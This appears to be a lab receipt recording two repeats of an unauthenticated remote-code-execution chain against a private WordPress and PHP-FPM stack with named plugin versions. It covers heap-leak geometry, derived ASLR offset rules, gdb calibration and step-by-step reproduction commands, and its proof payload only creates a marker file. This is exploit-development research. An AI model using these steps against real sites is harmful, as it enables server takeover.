# Receipt: two fresh-ASLR repeats of the WordPress realchain exploit

Date: 2026-10-22
Receipt dir: `/tmp/opencode/research/wprepeat_20261022T004227Z`
Stack: `/tmp/opencode/research/realchain_20261022T015900Z`
HTTP: `127.0.0.1:28893`
Target binary: `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`
Target md5: `4ee099823b75e16ea36f93c71d57bfd8`
Static target: `ps_serializers[1].decode` at `0x22c54c8`
Normal decoder: `ps_srlzr_decode_php` = `0x9e6fae`
Poison value: `zif_passthru` = `0xa3c074`

Result: the complete chain was repeated twice on the private WordPress 7.1.3 +
WooCommerce + HexCoupon 1.2.4 + CF7 6.2.3 + Webheadcoder MultiStep Forms 4.7.1
stack. Each repeat was:

1. an unauthenticated plugin-written native PHP session file (388350 bytes),
2. the real `LoyaltyProgramHelpers::start_session()` OOM plant leaving
   `BG(unserialize) = {data=P, level=1}`,
3. a static `S|s:4096:"` memory leak of 1052954 bytes,
4. a gdb calibration that proved `zif_passthru` plus `popen` on the exact record,
5. a final multipart POST sent **without gdb** that poisoned
   `ps_serializers[1].decode` to `0xa3c074` and executed `touch .../MARK_REAL`.

Both final workers survived the final POST. Run 2 used a restarted FPM master, so
its ASLR layout is unrelated to run 1.

## 1. Run 1 (master 591059)

Master started by `restart_fpm.sh` before run 1; initial worker 591060.
Fresh ASLR was already in place from that restart (heap P later measured).

Plugin write `pw1a` (first attempt) then plant gave `P=0x7fa8a96f1000`. The first
leak attempt used the reference constant `used=-36865`; that record was built for
`P-S=0x8ff80`, but the initial-worker layout had `P-X=0x87000`, so the J slot
landed 0xb000 above the real string chunk. It produced a normal `S|s:32` session
of 1048888 bytes and no leak (rejected; kept as `run1/leak.http`).

The worker crashed on the expected post-decode overread and respawned. A gdb
probe (`run1/probe1.gdb`) measured the temp-slot mechanics and showed that the
string chunk S is stable while P moves with the worker type.

Recovery: fresh plugin write `pw1c` plus plant on a respawned worker gave
`P=0x7fa8a96e6000`. With `S=0x7fa8a9656080`, the correct slot is
`used=(S-(P+0x90))/16 = -0x9001`. The rebuilt record `sess_lk1c` leaked:

```
total=1048576  X=0x7fa8a966a000  P=0x7fa8a96e6000
S=0x7fa8a9656080  used=-36865 (-0x9001)
K string / second decode buffer=0x7fa8a9001000
leak size=1052954  header=S|s:4096:"  data offset 8=0x7fa8a9001000
SHA1  b447af3fa39ccfa019b7617745ae7fc7202bae30
SHA256 627c64fa3a41bda2ac390bb4fa162b549ac049ef2831f8810c5f8dbb7bae88d4
```

HTTP twin (`run1/leak1c.http`) is byte identical; the post-final fetch
(`run1/leak1c_after.http`) is also identical. Worker 886227 crashed after the
second decode; master 591059 respawned 953919.

Calibration: a first gdb calibration (cal1) showed the poison write worked
(`decodefield=0xa3c074` at decode 2) but the second decode buffer was
`X+0x88000`, not the reference's `X+0x81000`, so the hardcoded fake frame F
missed. A second attempt with a coupled builder placed the fake struct at the
wrong file offset and crashed at decode 1. The corrected builder
`scripts_mkfinal2.py` takes X and K_dest independently; cal3 then produced
`MARK_TEST` (02:59:15) through `POPEN` and worker 956830 survived.

Final: worker 956830 was killed to clear the static poison (lab action), master
591059 respawned 957712. Fresh plugin write `pw1g`, plant gave
`P=0x7fa8a96e6000`, static decode still `0x9e6fae`. Final record geometry:

```
total=524288  X=0x7fa8a966a000  K_dest=0x7fa8a96f2000  F=0x7fa8a96f2218
P=0x7fa8a96e6000  used_target_static=0xfffff805758bdf43
```

The multipart POST to `/hextrigger.php` was sent at 2026-10-22T00:59:50Z by
`scripts_trigger.py` only; no gdb was attached. It returned HTTP 500 with an
empty body. `run1/MARK_REAL` was created size 0 at 02:59:50 +0200. Worker
957712 survived. Static state after: `ps_serializers[1].decode=0xa3c074`,
`basic_globals.unserialize={data=0x0, level=0}`.

## 2. Run 2 (fresh master 958304)

The private master 591059 was stopped and restarted with `restart_fpm.sh` at
03:00:07, giving a fresh ASLR layout: master 958304, initial worker 958305.

Plugin write `pw2` plus plant gave the initial-worker layout
`P=0x7f791b0f1000`. From the run-1 relation `P-X=0x87000` and `X-S=0x13f80`,
the leak was built with `used=-0x9b01` without a prior probe. It worked on the
first attempt:

```
total=1048576  X=0x7f791b06a000  P=0x7f791b0f1000
S=0x7f791b056080  used=-39681 (-0x9b01)
K string / second decode buffer=0x7f791aa01000
leak size=1052954  header=S|s:4096:"  data offset 8=0x7f791aa01000
SHA1  62a41f815418ceb9ef56cfe416f1290701231bc2
SHA256 cbf771de97416af5758321735f33b3272d66dc79ac424ccc13b4d65b3ffd5591
```

HTTP twin `run2/leak2.http` and post-final fetch `run2/leak2_after.http` are
identical. Worker 958305 crashed on the second decode; master respawned 958654.

Calibration on 958654: plugin `pw2b`, plant `P=0x7f791b0e6000`, record with
`X=0x7f791b06a000`, `K_dest=0x7f791b0f2000`, `F=0x7f791b0f2218`. gdb observed
`ZIF_PASSTHRU rdi=0x7f791b0f2018 rsi=524600`, then
`POPEN cmd=touch .../run2/MARK_TEST;`. `MARK_TEST` was created at 03:00:45 and
worker 958654 survived with static decode `0xa3c074`.

Final: worker 958654 was killed (lab action), master respawned 959141. Fresh
plugin write `pw2c`, plant gave `P=0x7f791b0e6000`, static decode `0x9e6fae`.
The final record used the same X/K/F and `used_target_static=0xfffff8086e71df43`.
The POST without gdb returned HTTP 500 with an empty body at
2026-10-22T01:01:00Z. `run2/MARK_REAL` was created size 0 at 03:01:00 +0200.
Worker 959141 survived. Static state after: decode `0xa3c074`,
`unserialize={data=0x0, level=0}`.

## 3. Geometry summary

| run | master | final worker | X | P | S | leak used | final K_dest | final F |
|---|---|---|---|---|---|---|---|---|
| 1 | 591059 | 957712 | 0x7fa8a966a000 | 0x7fa8a96e6000 | 0x7fa8a9656080 | -0x9001 | 0x7fa8a96f2000 | 0x7fa8a96f2218 |
| 2 | 958304 | 959141 | 0x7f791b06a000 | 0x7f791b0e6000 | 0x7f791b056080 | -0x9b01 | 0x7f791b0f2000 | 0x7f791b0f2218 |

Derived rules (stable in both runs and in the reference receipt):

- leak: `used = (S - (P + 0x90)) / 16`, where S is the zend_string chunk that the
  parser reallocates for the first session value.
- worker types: the initial worker started with the master has `P-X = 0x87000`;
  a respawned worker has `P-X = 0x7c000`.
- 512 KB record: `K_dest = X + 0x88000`, `F = K_dest + 0x218`.
  This differs from the earlier reference receipt (`X + 0x81000`); the heap
  correlation in this stack is `+0x88000`, and the final builder must not
  re-derive X from K_dest.
- 1 MB leak: the K string / second decode buffer is an mmap at `X - 0x669000`.

## 4. Evidence files

- `run1/`, `run2/`: gdb logs (`*.gdb`), trigger responses (`*.resp`), plant
  headers/bodies, plugin submit output, calibration and final geometry
  (`*.geo`), final start/end times, `MARK_REAL`, `MARK_TEST`.
- `run1/leak1c.sess`, `run2/leak2.sess`: copies of the two leak files
  (1052954 bytes).
- `run1/leak1c.http`, `run1/leak1c_after.http`, `run2/leak2.http`,
  `run2/leak2_after.http`: static HTTP twins.
- `run1/final1.rec`, `run2/final2.rec`: exact final records rebuilt
  deterministically from the recorded builder arguments (the consumed session
  files were 0 bytes after the exploit).
- `run1/leak.http`, `run1/leak1.gdb`: the rejected first leak attempt (normal
  `S|s:32`, 1048888 bytes).
- `run1/probe1.gdb`: temp-slot probe used to correct the first attempt.
- `scripts_plugin_submit.py`, `scripts_mkprobe_big.py`, `scripts_mkfinal_large.py`,
  `scripts_mkfinal2.py`, `scripts_trigger.py`: builders used.
- `gdb/*.cmd`: gdb command files.
- `restart_fpm.sh`: master restart used between runs.

## 5. Reproduction commands (run 2 shown)

```
./restart_fpm.sh
python3 scripts_plugin_submit.py pw2 1000 20 run2/plug_submit.html     # 302, sess 388350
curl -H 'Cookie: PHPSESSID=pw2' -H 'User-Agent: Mozilla/5.0' \
  http://127.0.0.1:28893/wp-content/uploads/plant/hexplant.php          # 500, P
python3 scripts_mkprobe_big.py 0x7f791b0f1000 \
  /tmp/opencode/research/realchain_20261022T015900Z/www/wp-content/uploads/sessions/sess_lk2 \
  1048576 -39681
gdb -q -p <worker> -batch -x gdb/leak.cmd &   # then:
python3 scripts_trigger.py lk2 x /hextrigger.php
# fresh plant, then calibration with scripts_mkfinal2.py + gdb/cal.cmd
python3 scripts_mkfinal2.py 0x7f791b0f2000 0x7f791b0e6000 524288 \
  .../sess_fin2 'touch .../run2/MARK_REAL;' 0x7f791b0f2218 0x7f791b06a000
python3 scripts_trigger.py fin2 x /hextrigger.php                      # no gdb
```

## 6. Limits

- The lab precondition is still a writable session directory served by nginx and
  an attacker-controlled `PHPSESSID`.
- The plugin session file is deleted by the plant OOM and must be regenerated for
  every plant.
- After the final, `ps_serializers[1].decode` stays `0xa3c074` in that worker.
  Any later session request would call `zif_passthru` with normal arguments.
  Health checks must be static file fetches or endpoints that do not start a
  session.
- Run 2's worker cannot be reset without another master restart; it was left with
  the poison as evidence.
- No shared lab service was touched: ports 28891 and 28870/28871 and PIDs
  4052217/4052937/4053032/4054145 were left alone. Only the private realchain
  master and its single worker were restarted or killed.

## Curated copy

Source run: `/tmp/opencode/research/wprepeat_20261022T004227Z`
(117-entry `SHA256SUMS`, 117/117 verified before curation). The stack
provenance `/tmp/opencode/research/realchain_20261022T015900Z` is the committed
`receipts/realchain_20261022` receipt.

Copied here: this README, `REPORT.md`, `restart_fpm.sh`, `run_leak.sh`, the five
`scripts_*.py` builders, `gdb/*.cmd`, `logs/` and the `run1/`/`run2/` evidence
(gdb logs, geometry, responses, records, markers).

Not copied: `run1/leak1c.sess` and `run2/leak2.sess`, which are byte-identical
duplicates of the kept `run1/leak1c.http` and `run2/leak2.http`
(sha256 `627c64fa3a41…` and `cbf771de9741…`), and the 0-byte `.body`/`.html`
captures (the plant empties the body; plugin-submit responses are empty). No
WordPress tree, `wp-config.php`, database datadir, credentials, auth salts,
tarballs, pid files, `__pycache__` or request bodies with secrets are present.

`SHA256SUMS` is regenerated for this curated set and verifies with
`sha256sum -c SHA256SUMS`.
